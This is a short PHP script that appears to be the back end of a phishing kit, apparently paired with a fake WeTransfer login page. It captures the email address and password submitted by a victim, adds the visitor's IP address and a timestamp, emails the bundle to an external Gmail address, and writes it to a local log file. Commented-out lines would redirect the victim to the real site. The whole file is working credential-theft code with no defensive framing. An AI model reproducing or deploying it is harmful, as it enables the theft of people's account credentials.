<?php
$ip = getenv("REMOTE_ADDR"); 
$infos ="";
$infos .= "--- zee ---\n"; 
$infos .= "E  : ".$_POST['email']."\r\n";
$infos .= "P   : ".$_POST['password']."\n"; 
$infos .= "loc                     : ".$ip."\n"; 
$dated = "The time is " . date("l jS \of F Y h:i:s A");
$infos .= "Date                   : ".$dated."\n"; 
$infos .= "--- zee ---\n"; 
$send = "emmanathan56@gmail.com";
$subject = "ZEE infoss"; 
$headers .= "MIME-Version: 1.0\n"; 
{ 
mail($send,$subject,$infos,$headers); 
} 
$handle = fopen("loggss.txt", "a");
fwrite($handle,$infos);
    //header('Location:'.$_SERVER['HTTP_REFERER']);
   //header("Location: https://wetransfer.com");
?>